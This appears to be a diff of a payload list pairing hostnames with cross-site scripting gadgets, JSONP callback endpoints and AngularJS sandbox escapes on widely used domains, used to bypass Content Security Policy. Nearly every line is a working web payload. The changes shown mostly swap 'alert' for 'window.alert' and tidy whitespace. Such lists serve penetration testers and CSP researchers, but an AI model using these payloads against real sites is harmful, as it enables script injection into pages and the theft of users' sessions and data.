-monitoring.clients6.google.com  <script src="https://monitoring.clients6.google.com/v3/projects/gen-lang-client-1/groups?callback=alert(1)"></script>
-mouseflow.com	<script src="https://mouseflow.com/wp-json?_jsonp=alert"></script>
-mts1.googleapis.com <script src="https://mts1.googleapis.com/mapslt/ft?hl=en&lyrs=ft&x=1&y=1&z=1&src=apiv3&callback=alert(1)"></script>
-njkqvifkj7ta6kg86wczisp36m8d01mg.edns.ip-api.com  <script src="https://njkqvifkj7ta6kg86wczisp36m8d01mg.edns.ip-api.com/json?callback=alert(1)"></script>
+monitoring.clients6.google.com	<script src="https://monitoring.clients6.google.com/v3/projects/gen-lang-client-1/groups?callback=alert(1)"></script>
+mouseflow.com	<script src="https://mouseflow.com/wp-json?_jsonp=window.alert"></script>
+mts1.googleapis.com	<script src="https://mts1.googleapis.com/mapslt/ft?hl=en&lyrs=ft&x=1&y=1&z=1&src=apiv3&callback=alert(1)"></script>
+njkqvifkj7ta6kg86wczisp36m8d01mg.edns.ip-api.com	<script src="https://njkqvifkj7ta6kg86wczisp36m8d01mg.edns.ip-api.com/json?callback=alert(1)"></script>
 nominatim.openstreetmap.org	<script src="https://nominatim.openstreetmap.org/search?q=&format=json&addressdetails=1&polygon_geojson=1&json_callback=alert"></script>
 oamssoqae.ieee.org	<script src="https://oamssoqae.ieee.org/ieeevendorsso/ssocookievalidator?callback=alert(1)-"></script>
-okaccedo.com	<script src="https://okaccedo.com/wp-json?_jsonp=alert"></script>
-okt.hackthebox.com  <script src="https://okt.hackthebox.com/ping?callback=alert(1)"></script>
-omtr2.partners.salesforce.com   <script src="https://omtr2.partners.salesforce.com/id?callback=alert"></script>
+okaccedo.com	<script src="https://okaccedo.com/wp-json?_jsonp=window.alert"></script>
+okt.hackthebox.com	<script src="https://okt.hackthebox.com/ping?callback=alert(1)"></script>
+omtr2.partners.salesforce.com	<script src="https://omtr2.partners.salesforce.com/id?callback=alert"></script>
 openexchangerates.org	<script src="https://openexchangerates.org/api/latest.json?app_id=4a363014b909486b8f49d967b810a6c3&callback=alert(document.domain)"></script>
-openx.com	<script src="https://openx.com/wp-json?_jsonp=alert"></script>
+openx.com	<script src="https://openx.com/wp-json?_jsonp=window.alert"></script>
 page.gitlab.com	<script src="https://page.gitlab.com/index.php/form/getForm?munchkinId=194-VVC-221&form=1077&callback=alert"></script>
 pages.nist.gov	<body ng-app ng-csp><script src="https://pages.nist.gov/opensource/js/angular.min.js"></script><div ng-app ng-csp><div ng-focus="x=$event;" id=f tabindex=0>foo</div><div ng-repeat="(key, value) in x.view"><div ng-if="key == 'window'">{{ [1].reduce(value.alert, 1); }}</div></div></div></body>
-partner.googleadservices.com	<script src="https://partner.googleadservices.com/gampad/cookie.js?domain=x&callback=alert&client=ca-pub-3374367632700222"></script>
+partner.googleadservices.com	<script src="https://partner.googleadservices.com/gampad/cookie.js?domain=x&callback=window.alert&client=ca-pub-3374367632700222"></script>
 passport.baidu.com	<script src="https://passport.baidu.com/channel/unicast?callback=alert"></script>
 polyfill-fastly.io	<script src="https://polyfill-fastly.io/v3/polyfill.min.js?callback=alert"></script>
 polyfill.alicdn.com	<script src="https://polyfill.alicdn.com/v3/polyfill.min.js?callback=alert"></script>
-preply.com	<script src="https://preply.com/wp-json?_jsonp=alert"></script>
-pubads.g.doubleclick.net	<script src="https://pubads.g.doubleclick.net/gampad/ads?gdfp_req=1&output=json_html&callback=alert&impl=fifs&json_a=1&iu_parts=4215%2Cimdb2.consumer.homepage&enc_prev_ius=%2F0%2F1%2C%2F0%2F1&prev_iu_szs=1008x150%7C1008x200%7C1008x30%7C970x250%7C9x1%2C300x250%7C11x1&cust_params=fv%3D1%26ab%3Df%26bpx%3D1%26c%3D1%26s%3D3075%252C32%26u%3D142752923777%26oe%3Dutf-8"></script>
-public-api.wordpress.com	<script src="https://public-api.wordpress.com/rest/v1/sites/en.blog.wordpress.com/posts/?number=1&callback=alert"></script>
-publish.twitter.com	<script src="https://publish.twitter.com/oembed?url=https://twitter.com/jack/status/20&callback=alert"></script>
-pubmatic.com	<script src="https://pubmatic.com/wp-json/wp/v2/posts/?_jsonp=alert"></script>
+preply.com	<script src="https://preply.com/wp-json?_jsonp=window.alert"></script>
+pubads.g.doubleclick.net	<script src="https://pubads.g.doubleclick.net/gampad/ads?gdfp_req=1&output=json_html&callback=window.alert&impl=fifs&json_a=1&iu_parts=4215%2Cimdb2.consumer.homepage&enc_prev_ius=%2F0%2F1%2C%2F0%2F1&prev_iu_szs=1008x150%7C1008x200%7C1008x30%7C970x250%7C9x1%2C300x250%7C11x1&cust_params=fv%3D1%26ab%3Df%26bpx%3D1%26c%3D1%26s%3D3075%252C32%26u%3D142752923777%26oe%3Dutf-8"></script>
+public-api.wordpress.com	<script src="https://public-api.wordpress.com/rest/v1/sites/en.blog.wordpress.com/posts/?number=1&callback=window.alert"></script>
+publish.twitter.com	<script src="https://publish.twitter.com/oembed?url=https%3A%2F%2Ftwitter.com%2Fjack%2Fstatus%2F20&callback=window.alert"></script>
+pubmatic.com	<script src="https://pubmatic.com/wp-json/wp/v2/posts/?_jsonp=window.alert"></script>
 query.fqtag.com	<script src="https://query.fqtag.com/b?callback=alert(1)"></script>
 r.skimresources.com	<script src="https://r.skimresources.com/api/?callback=alert"></script>
 raae2vza0snymz9cm3r8ix74bs71vdlz.edns.ip-api.com	<script src="https://raae2vza0snymz9cm3r8ix74bs71vdlz.edns.ip-api.com/json?callback=alert(1)-"></script>
 recaptcha.net	<script src="https://recaptcha.net/recaptcha/api.js?onload=alert"></script>
-recs.algorecs.com  <script src="https://recs.algorecs.com/rrserver/api/engage/targeting?callback=alert(1)"></script>
-recs.richrelevance.com  <script src="https://recs.richrelevance.com/rrserver/api/personalize?callback=alert(1)"></script>
-reklamstore.com	<script src="https://reklamstore.com/wp-json?_jsonp=alert"></script>
+recs.algorecs.com	<script src="https://recs.algorecs.com/rrserver/api/engage/targeting?callback=alert(1)"></script>
+recs.richrelevance.com	<script src="https://recs.richrelevance.com/rrserver/api/personalize?callback=alert(1)"></script>
+reklamstore.com	<script src="https://reklamstore.com/wp-json?_jsonp=window.alert"></script>
 rentokil-domains.firebaseio.com	<script src="https://rentokil-domains.firebaseio.com/.json?callback=alert(1)-"></script>
 resourceexplorer-ead9dsh0dvasgrar.b01.azurefd.net	<body ng-app ng-csp><script src="https://resourceexplorer-ead9dsh0dvasgrar.b01.azurefd.net/explorercdn/angular1.6/angular.min.js"></script><div ng-app ng-csp><div ng-focus="x=$event;" id=f tabindex=0>foo</div><div ng-repeat="(key, value) in x.view"><div ng-if="key == 'window'">{{ [1].reduce(value.alert, 1); }}</div></div></div></body>
-resultsmedia.com	<script src="https://resultsmedia.com/wp-json?_jsonp=alert"></script>
+resultsmedia.com	<script src="https://resultsmedia.com/wp-json?_jsonp=window.alert"></script>
 ring.com	<script src="https://ring.com/partials/consent/sv-SE/strings.json?callback=alert"></script>
 romania.amazon.com	<body ng-app ng-csp><script src="https://romania.amazon.com/app/vendor.min.js"></script><input id=x ng-focus=$event.composedPath()|orderBy:'(z=alert)(1)'></body>
 rtb0.doubleverify.com	<script src="https://rtb0.doubleverify.com/verify.js?jsCallback=alert(1)"></script>
 s.fqtag.com	<script src="https://s.fqtag.com/b?callback=alert(1)"></script>
 s.yimg.jp	<body ng-app ng-csp><script src="https://s.yimg.jp/images/jpnews/cre/owned_media/v2/js/angular.js"></script><div ng-app ng-csp><div ng-focus="x=$event;" id=f tabindex=0>foo</div><div ng-repeat="(key, value) in x.view"><div ng-if="key == 'window'">{{ [1].reduce(value.alert, 1); }}</div></div></div></body>
 s.ytimg.com	<body ng-app ng-csp><script src="https://s.ytimg.com/yts/jslib/angular.min-vfl8oYsy-.js"></script><input autofocus ng-focus="$event.composedPath()|orderBy:'[].constructor.from([1],alert)'"></body>
-sanalofisonline.com	<script src="https://sanalofisonline.com/wp-json?_jsonp=alert"></script>
+sanalofisonline.com	<script src="https://sanalofisonline.com/wp-json?_jsonp=window.alert"></script>
 search.yahoo.com	<script src="https://search.yahoo.com/sugg/gossip/gossip-us-ura/?f=1&.crumb=wYtclSpdh3r&output=sd1&command=&pq=&l=1&bm=3&appid=exp-ats1.l7.search.vip.ir2.yahoo.com&t_stmp=1571806738592&nresults=10&bck=1he6d8leq7ddu%26b%3D3%26s%3Dcb&csrcpvid=8wNpljk4LjEYuM1FXaO1vgNfMTk1LgAAAAA5E2a9&vtestid=&mtestid=&spaceId=1197804867&callback=confirm"></script>
-secure.gravatar.com	<script src="https://secure.gravatar.com/930fc2e7cd239606c398bff5b5fc12e7.json?callback=alert"></script>
-securepubads.g.doubleclick.net	<script src="https://securepubads.g.doubleclick.net/gampad/ads?gdfp_req=1&output=json_html&iu=%2F32173961%2Fdesktop%2Ffrontpage%2Flisting&sz=300x250&url=https%3A%2F%2Fwww.reddit.com%2F&vrg=147&callback=alert"></script>
+secure.gravatar.com	<script src="https://secure.gravatar.com/930fc2e7cd239606c398bff5b5fc12e7.json?callback=window.alert"></script>
+securepubads.g.doubleclick.net	<script src="https://securepubads.g.doubleclick.net/gampad/ads?gdfp_req=1&output=json_html&iu=%2F32173961%2Fdesktop%2Ffrontpage%2Flisting&sz=300x250&url=https%3A%2F%2Fwww.reddit.com%2F&vrg=147&callback=window.alert"></script>
 server.ethicalads.io	<script src="https://server.ethicalads.io/api/v1/decision/?publisher=jsbin&ad_types=x&format=jsonp&div_ids=x&callback=alert(1)-"></script>
-sharethis.com	<script src="https://sharethis.com/wp-json?_jsonp=alert"></script>
-shop.samsung.com	<script src="https://shop.samsung.com/br/_v/private/ng/p4v1/getCartCount?callback=alert"></script>
-smaato.com	<script src="https://smaato.com/wp-json?_jsonp=alert"></script>
+sharethis.com	<script src="https://sharethis.com/wp-json?_jsonp=window.alert"></script>
+shop.samsung.com	<script src="https://shop.samsung.com/br/_v/private/ng/p4v1/getCartCount?callback=window.alert"></script>
+smaato.com	<script src="https://smaato.com/wp-json?_jsonp=window.alert"></script>
 smartcaptcha.yandexcloud.net	<script src="https://smartcaptcha.yandexcloud.net/captcha.js?render=onload&onload=alert"></script>
-social.invicti.com  <script src="https://social.invicti.com/ping?callback=alert(1)"></script>
+social.invicti.com	<script src="https://social.invicti.com/ping?callback=alert(1)"></script>
 social.yandex.ru	<script src="https://social.yandex.ru/providers.jsonp?callback=alert"></script>
-soundcloud.com	<script src="https://soundcloud.com/oembed?format=js&callback=alert&url=https://soundcloud.com/rich-the-kid/plug-walk-1"></script>
-speller.yandex.net  <script src="https://speller.yandex.net/services/spellservice.json/checkText?text=123&callback=alert(1)"></script>
-srv.buysellads.com  <script src="https://srv.buysellads.com/ads/CEBICK3M.json?callback=alert"></script>
+soundcloud.com	<script src="https://soundcloud.com/oembed?format=js&callback=alert%281337%29&url=https%3A%2F%2Fsoundcloud.com%2Frich-the-kid%2Fplug-walk-1"></script>
+speller.yandex.net	<script src="https://speller.yandex.net/services/spellservice.json/checkText?text=123&callback=alert(1)"></script>
+srv.buysellads.com	<script src="https://srv.buysellads.com/ads/CEBICK3M.json?callback=alert"></script>
 srv.carbonads.net	<script src="https://srv.carbonads.net/ads/x.json?callback=alert"></script>
 ssl.gstatic.com	<body ng-app ng-csp><script src="//ssl.gstatic.com/fsn/angular_js-bundle1.js"></script><input autofocus ng-focus="$event.composedPath()|orderBy:'[].constructor.from([1],alert)'"></body>
-sso.bytedance.com	<script src="https://sso.bytedance.com/watermark/?callback=alert"></script>
+sso.bytedance.com	<script src="https://sso.bytedance.com/watermark/?callback=window.alert"></script>
 st3.zoom.us	<script src="https://st3.zoom.us/static/6.2.7600/js/lib/angular.min.js"></script><div ng-app><input autofocus ng-focus="window=$event.target.ownerDocument.defaultView;window.alert(window.origin);">
 static.parastorage.com	<body ng-app ng-csp><script src="https://static.parastorage.com/services/third-party/angularjs/1.4.5/angular.min.js"></script><input autofocus ng-focus="$event.composedPath()|orderBy:'[].constructor.from([1],alert)'"></body>
-statics.teams.cdn.office.net <script src=https://statics.teams.cdn.office.net/hashed/0.2-angular-jquery.min-eee9041.js></script><div ng-app>{{x={"n":"".constructor.prototype};x["n"].charAt=[].join;$eval("x=alert(1)");}}</div>
+statics.teams.cdn.office.net	<script src=https://statics.teams.cdn.office.net/hashed/0.2-angular-jquery.min-eee9041.js></script><div ng-app>{{x={"n":"".constructor.prototype};x["n"].charAt=[].join;$eval("x=alert(1)");}}</div>
 storemapper-herokuapp-com.global.ssl.fastly.net	<script src="https://storemapper-herokuapp-com.global.ssl.fastly.net/api/users/9223/stores.js?callback=alert(1)-"></script>
-streetviewpixels-pa.googleapis.com <script src="https://streetviewpixels-pa.googleapis.com/v1/tile?cb_client=apiv3&panoid=y8IQXMsYAZ2S9TCAFd_xNw&output=tile&x=0&y=0&zoom=0&nbt=1&fover=2&callback=alert(1)"></script>
-suggest.taobao.com	<script src="https://suggest.taobao.com/sug?callback=alert"></script>
+streetviewpixels-pa.googleapis.com	<script src="https://streetviewpixels-pa.googleapis.com/v1/tile?cb_client=apiv3&panoid=y8IQXMsYAZ2S9TCAFd_xNw&output=tile&x=0&y=0&zoom=0&nbt=1&fover=2&callback=alert(1)"></script>
+suggest.taobao.com	<script src="https://suggest.taobao.com/sug?callback=window.alert"></script>
 suggestqueries-clients6.youtube.com	<script src="https://suggestqueries-clients6.youtube.com/complete/search?client=youtube&q=$query&callback=alert"></script>
 support.zendesk.com	<script src="https://support.zendesk.com/accounts/reminder?callback=alert(window.location)//"></script>
 sync.im-apps.net	<script src="https://sync.im-apps.net/imid/segment?callback=alert(1)&token=VXoW9wEaCAYxiIkb8Mzm7Q"></script>
 tagmanager.google.com	<script src="https://tagmanager.google.com/debug/api/vtinfo?gtm_auth=a-0uanYFkML7e3v7Vmxpwg&env_id=env-8&public_id=GTM-TWMCBFD&templates=&callback=alert"></script>
-tebilisim.com	<script src="https://tebilisim.com/wp-json?_jsonp=alert"></script>
-termly.io	<script src="https://termly.io/wp-json?_jsonp=alert"></script>
-thebrave.io	<script src="https://thebrave.io/wp-json?_jsonp=alert"></script>
-thiscanbeanything.zendesk.com	<script src="https://thiscanbeanything.zendesk.com/sc/faye/?message=[{%22channel%22:%22%22}]&jsonp=alert"></script>
+tebilisim.com	<script src="https://tebilisim.com/wp-json?_jsonp=window.alert"></script>
+termly.io	<script src="https://termly.io/wp-json?_jsonp=window.alert"></script>
+thebrave.io	<script src="https://thebrave.io/wp-json?_jsonp=window.alert"></script>
+thiscanbeanything.zendesk.com	<script src="https://thiscanbeanything.zendesk.com/sc/faye/?message=%5B%7B%22channel%22%3A%22%22%7D%5D&jsonp=window.alert"></script>
 tlx.3lift.com	<script src=https://tlx.3lift.com/header/auction?callback=alert(1)></script>
-tr.indeed.com	<script src="https://tr.indeed.com/m/newjobs?q=&l=&ts=1734358724474&callback=alert"></script>
+tr.indeed.com	<script src="https://tr.indeed.com/m/newjobs?q=&l=&ts=1734358724474&callback=window.alert"></script>
 tr.snapchat.com	<script src="https://tr.snapchat.com/config/com/%27%29%3B%7Dcatch%28e%29%7B%7D%7D%3Balert%281%29%3B%21function%28%29%7Btry%7B%28%27.js"></script>
-track.consensus.app  <script src="https://track.consensus.app/track/?callback=alert(1)"></script>
-translate-pa.googleapis.com  <script src="https://translate-pa.googleapis.com/v1/supportedLanguages?callback=alert(1)"></script>
+track.consensus.app	<script src="https://track.consensus.app/track/?callback=alert(1)"></script>
+translate-pa.googleapis.com	<script src="https://translate-pa.googleapis.com/v1/supportedLanguages?callback=alert(1)"></script>
 translate.google.com	<script src="https://translate.google.com/translate_a/element.js?cb=alert"></script>
 translate.googleapis.com	<script src="https://translate.googleapis.com/$discovery/rest?version=v3&callback=alert();"></script>
-translate.yandex.net	<script src="https://translate.yandex.net/api/v1.5/tr.json/detect?callback=alert"></script>
-trustarc.com	<script src="https://trustarc.com/wp-json?_jsonp=alert"></script>
-typekit.com	<script src="https://typekit.com/api/v1/json/libraries/full?callback=alert"></script>
+translate.yandex.net	<script src="https://translate.yandex.net/api/v1.5/tr.json/detect?callback=window.alert"></script>
+trustarc.com	<script src="https://trustarc.com/wp-json?_jsonp=window.alert"></script>
+typekit.com	<script src="https://typekit.com/api/v1/json/libraries/full?callback=window.alert"></script>
 udgnoz7mccyaowzp.public.blob.vercel-storage.com	<script src="https://udgnoz7mccyaowzp.public.blob.vercel-storage.com/a-LAZhjxXucrzBiROqCt4bsY3n6srlWP.js"></script>
-ug.alibaba.com	<script src="https://ug.alibaba.com/api/ship/read?callback=alert"></script>
-uk.indeed.com	<script src="https://uk.indeed.com/m/newjobs?callback=alert"></script>
+ug.alibaba.com	<script src="https://ug.alibaba.com/api/ship/read?callback=window.alert"></script>
+uk.indeed.com	<script src="https://uk.indeed.com/m/newjobs?callback=window.alert"></script>
 ulogin.ru	<script src="https://ulogin.ru/token.php?callback=alert(1337)"></script>
 unpkg.com	<script src="https://unpkg.com/angular@1.8.3/angular.min.js"></script><div ng-app><img src=x ng-on-error="window=$event.target.ownerDocument.defaultView;window.alert(window.origin);">
 unpkg.com	<script src="https://unpkg.com/htmx.org"></script><any hx-trigger="x[1)}),alert(origin)//]">
 unpkg.com	<script src="https://unpkg.com/hyperscript.org"></script><x _="on load alert(1)">
 urs.pbs.org	<script src="https://urs.pbs.org/redirect/1/?format=jsonp&callback=alert(1)"></script>
-usercentrics.eu	<script src="https://usercentrics.eu/wp-json?_jsonp=alert"></script>
-vidyome.com	<script src="https://vidyome.com/wp-json?_jsonp=alert"></script>
-vimeo.com	<script src="https://vimeo.com/api/v2/video/1006042481.json?callback=alert"></script>
+usercentrics.eu	<script src="https://usercentrics.eu/wp-json?_jsonp=window.alert"></script>
+vidyome.com	<script src="https://vidyome.com/wp-json?_jsonp=window.alert"></script>
+vimeo.com	<script src="https://vimeo.com/api/v2/video/1006042481.json?callback=window.alert"></script>
 visitor-service.tealiumiq.com	<script src="https://visitor-service.tealiumiq.com/northwesternmutual/main/q?callback=alert(1)"></script>
-visualwebsiteoptimizer.com	<script src="https://visualwebsiteoptimizer.com/wp-json/wp/v2/posts/?_jsonp=alert"></script>
-wb.amap.com	<script src="https://wb.amap.com/channel.php?callback=alert"></script>
+visualwebsiteoptimizer.com	<script src="https://visualwebsiteoptimizer.com/wp-json/wp/v2/posts/?_jsonp=window.alert"></script>
+wb.amap.com	<script src="https://wb.amap.com/channel.php?callback=window.alert"></script>
 widget.usersnap.com	<script src="https://widget.usersnap.com/load/d5abc654-0976-45b9-8074-fa5e721db433?onload=alert"></script>
-widgets.pinterest.com	<script src="https://widgets.pinterest.com/v3/pidgets/boards/ciciwin/hedgehog-squirrel-crafts/pins/?callback=alert"></script>
-wikipedia.org	<script src="https://en.wikipedia.org/w/api.php?action=opensearch&format=json&limit=5&callback=alert&search=renniepak"></script>
-wordpress.org	<script src="https://wordpress.org/wp-json/wp/v2/posts/?_jsonp=alert"></script>
+widgets.pinterest.com	<script src="https://widgets.pinterest.com/v3/pidgets/boards/ciciwin/hedgehog-squirrel-crafts/pins/?callback=window.alert"></script>
+wikipedia.org	<script src="https://en.wikipedia.org/w/api.php?action=opensearch&format=json&limit=5&callback=window.alert&search=renniepak"></script>
+wordpress.org	<script src="https://wordpress.org/wp-json/wp/v2/posts/?_jsonp=window.alert"></script>
 wse.api.here.com	<script src="https://wse.api.here.com/v8/findsequence2?apiKey=<valid-api-key-here>&jsonCallback=alert(origin);void&mode=TransportModes"></script>
-www-api.ibm.com	<script src="https://www-api.ibm.com/search/typeahead/v1?lang=en&cc=us&query=l&callback=alert"></script>
-www.abtasty.com <script src="https://www.abtasty.com/wp-json?_jsonp=alert"></script>
-www.adpushup.com        <script src="https://www.adpushup.com/wp-json?_jsonp=alert"></script>
-www.altmetric.com       <script src="https://www.altmetric.com/wp-json?_jsonp=alert"></script>
+www-api.ibm.com	<script src="https://www-api.ibm.com/search/typeahead/v1?lang=en&cc=us&query=l&callback=alert%281337%29"></script>
+www.abtasty.com	<script src="https://www.abtasty.com/wp-json?_jsonp=alert"></script>
+www.adpushup.com	<script src="https://www.adpushup.com/wp-json?_jsonp=window.alert"></script>
+www.altmetric.com	<script src="https://www.altmetric.com/wp-json?_jsonp=window.alert"></script>
 www.ancestrycdn.com	<body ng-app ng-csp><script src="https://www.ancestrycdn.com/ui-static/lib/angular/1.2.3/angular.min.js"></script><div ng-app ng-csp><div ng-focus="x=$event;" id=f tabindex=0>foo</div><div ng-repeat="(key, value) in x.view"><div ng-if="key == 'window'">{{ [1].reduce(value.alert, 1); }}</div></div></div></body>
-www.appointlet.com      <script src="https://www.appointlet.com/wp-json?_jsonp=alert"></script>
-www.bazaarvoice.com     <script src="https://www.bazaarvoice.com/wp-json?_jsonp=alert"></script>
+www.appointlet.com	<script src="https://www.appointlet.com/wp-json?_jsonp=window.alert"></script>
+www.bazaarvoice.com	<script src="https://www.bazaarvoice.com/wp-json?_jsonp=window.alert"></script>
 www.bing.com	<script src="https://www.bing.com/api/maps/mapcontrol?key=AlSfV3wSTlPFqxEdS97v1d1ZK25Qg4OxZerOAjFYQPZwtY4bQqhz4jDRou_kCmbJ&callback=alert"></script>
 www.blogger.com	<script src="https://www.blogger.com/feeds/8063678697117239807/posts/default?callback=alert"></script>
-www.cookiebot.com       <script src="https://www.cookiebot.com/wp-json?_jsonp=alert"></script>
-www.criteo.com  <script src="https://www.criteo.com/wp-json?_jsonp=alert"></script>
-www.demandbase.com      <script src="https://www.demandbase.com/wp-json?_jsonp=alert"></script>
-www.ecwid.com   <script src="https://www.ecwid.com/wp-json?_jsonp=alert"></script>
+www.cookiebot.com	<script src="https://www.cookiebot.com/wp-json?_jsonp=window.alert"></script>
+www.criteo.com	<script src="https://www.criteo.com/wp-json?_jsonp=window.alert"></script>
+www.demandbase.com	<script src="https://www.demandbase.com/wp-json?_jsonp=window.alert"></script>
+www.ecwid.com	<script src="https://www.ecwid.com/wp-json?_jsonp=window.alert"></script>
 www.google-analytics.com	<script src="https://www.google-analytics.com/debug/api/vtinfo?gtm_auth=a-0uanYFkML7e3v7Vmxpwg&env_id=env-8&public_id=GTM-TWMCBFD&templates=&callback=alert"></script>
 www.google.com	<script src="https://www.google.com/complete/search?client=chrome&jsonp=alert(1)"></script>
 www.google.com	<script src='https://www.google.com/recaptcha/about/js/main.min.js'></script><img src=x ng-on-error='$event.target.ownerDocument.defaultView.alert(1)'>
@@ -288,32 +288,32 @@ www.googleapis.com	<script src="https://www.googleapis.com/customsearch/v1?callb
 www.googletagmanager.com	<script src="https://www.googletagmanager.com/debug/api/vtinfo?gtm_auth=a-0uanYFkML7e3v7Vmxpwg&env_id=env-8&public_id=GTM-TWMCBFD&templates=&callback=alert"></script>
 www.gstatic.com	<body ng-app ng-csp><script src="//www.gstatic.com/fsn/angular_js-bundle1.js"></script><input autofocus ng-focus="$event.composedPath()|orderBy:'[].constructor.from([1],alert)'"></body>
 www.gstatic.com	<script src='https://www.gstatic.com/recaptcha/about/js/main.min.js'></script><img src=x ng-on-error='$event.target.ownerDocument.defaultView.alert(1)'>
-www.hcaptcha.com        <script src="https://www.hcaptcha.com/1/api.js?onload=alert&render=explicit"></script>
-www.indexexchange.com   <script src="https://www.indexexchange.com/wp-json?_jsonp=alert"></script>
-www.ipinfo.io   <script src="https://www.ipinfo.io/?format=jsonp&callback=alert"></script>
+www.hcaptcha.com	<script src="https://www.hcaptcha.com/1/api.js?onload=alert&render=explicit"></script>
+www.indexexchange.com	<script src="https://www.indexexchange.com/wp-json?_jsonp=window.alert"></script>
+www.ipinfo.io	<script src="https://www.ipinfo.io/?format=jsonp&callback=alert"></script>
 www.meteoprog.ua	<script src="https://www.meteoprog.ua/data/weather/informer/Poltava.js?callback=alert(1337)"></script>
-www.microsoft.com	<script src="https://www.microsoft.com/en-us/research/wp-json?_jsonp=alert"></script>
-www.microsoft.com       <script src="https://www.microsoft.com/en-us/research/wp-json?_jsonp=alert"></script>
+www.microsoft.com	<script src="https://www.microsoft.com/en-us/research/wp-json?_jsonp=window.alert"></script>
+www.microsoft.com	<script src="https://www.microsoft.com/en-us/research/wp-json?_jsonp=window.alert"></script>
 www.paypal.com	<script src="https://www.paypal.com/checkoutnow/remembered?callback=alert"></script>
-www.paytr.com   <script src="https://www.paytr.com/wp-json?_jsonp=alert"></script>
-www.readspeaker.com     <script src="https://www.readspeaker.com/wp-json?_jsonp=alert"></script>
+www.paytr.com	<script src="https://www.paytr.com/wp-json?_jsonp=window.alert"></script>
+www.readspeaker.com	<script src="https://www.readspeaker.com/wp-json?_jsonp=window.alert"></script>
 www.recaptcha.net	<script src="https://www.recaptcha.net/recaptcha/api.js?onload=alert"></script>
-www.reddit.com	<script src="https://www.reddit.com/.json?limit=1&jsonp=alert"></script>
-www.reddit.com  <script src="https://www.reddit.com/.json?jsonp=alert"></script>
-www.reklamstore.com     <script src="https://www.reklamstore.com/wp-json?_jsonp=alert"></script>
-www.sanalofisonline.com <script src="https://www.sanalofisonline.com/wp-json?_jsonp=alert"></script>
-www.sovrn.com   <script src="https://www.sovrn.com/wp-json?_jsonp=alert"></script>
+www.reddit.com	<script src="https://www.reddit.com/.json?limit=1&jsonp=window.alert"></script>
+www.reddit.com	<script src="https://www.reddit.com/.json?jsonp=alert"></script>
+www.reklamstore.com	<script src="https://www.reklamstore.com/wp-json?_jsonp=window.alert"></script>
+www.sanalofisonline.com	<script src="https://www.sanalofisonline.com/wp-json?_jsonp=window.alert"></script>
+www.sovrn.com	<script src="https://www.sovrn.com/wp-json?_jsonp=window.alert"></script>
 www.st.com	<body ng-app ng-csp><script src="https://www.st.com/etc/clientlibs/st-search-cx/stangularjs.min.d9f5c8180af41b5cae710870b6b018fe.js"></script><input autofocus ng-focus="$event.composedPath()|orderBy:'[].constructor.from([1],alert)'"></body>
-www.thebrave.io <script src="https://www.thebrave.io/wp-json?_jsonp=alert"></script>
-www.vidyome.com <script src="https://www.vidyome.com/wp-json?_jsonp=alert"></script>
-www.wildapricot.com     <script src="https://www.wildapricot.com/wp-json?_jsonp=alert"></script>
+www.thebrave.io	<script src="https://www.thebrave.io/wp-json?_jsonp=window.alert"></script>
+www.vidyome.com	<script src="https://www.vidyome.com/wp-json?_jsonp=window.alert"></script>
+www.wildapricot.com	<script src="https://www.wildapricot.com/wp-json?_jsonp=window.alert"></script>
 www.yastat.net	<script src="https://www.yastat.net/s3/milab/js/angular.min.js"></script><div ng-app><input autofocus ng-focus="window=$event.target.ownerDocument.defaultView;window.alert(window.origin);">
 www.yastatic.net	<script src="https://www.yastatic.net/s3/milab/js/angular.min.js"></script><div ng-app><input autofocus ng-focus="window=$event.target.ownerDocument.defaultView;window.alert(window.origin);">
 www.youtube.com	<script src="https://www.youtube.com/oembed?callback=alert(1)"></script>
 yandex.st	<script src="https://yandex.st/jquery/1.8.2/jquery.min.js"></script><script src="https://yandex.st/bootstrap/3.0.3/js/bootstrap.min.js"></script><button data-toggle="modal" data-target="$('head').html('<script>alert(1)</script>')">Test XSS</button>
 yastat.net	<script src="https://yastat.net/s3/milab/js/angular.min.js"></script><div ng-app><input autofocus ng-focus="window=$event.target.ownerDocument.defaultView;window.alert(window.origin);">
 yastatic.net	<script src="https://yastatic.net/s3/milab/js/angular.min.js"></script><div ng-app><input autofocus ng-focus="window=$event.target.ownerDocument.defaultView;window.alert(window.origin);">
-yoast.com	<script src="https://yoast.com/wp-json?_jsonp=alert"></script>
+yoast.com	<script src="https://yoast.com/wp-json?_jsonp=window.alert"></script>
 yuedust.yuedu.126.net	<body ng-app ng-csp><script src="//yuedust.yuedu.126.net/js/components/angular/angular.js"></script><div ng-app ng-csp><div ng-focus="x=$event;" id=f tabindex=0>foo</div><div ng-repeat="(key, value) in x.view"><div ng-if="key == 'window'">{{ [1].reduce(value.alert, 1); }}</div></div></div></body>
 yugiohmonstrosdeduelo.blogspot.com	<script src="https://yugiohmonstrosdeduelo.blogspot.com/feeds/posts/summary?callback=alert"></script>
 zhike.help.360.cn	<script src="https://zhike.help.360.cn/api/v1/robotWindow?callback=alert(1)-"></script>
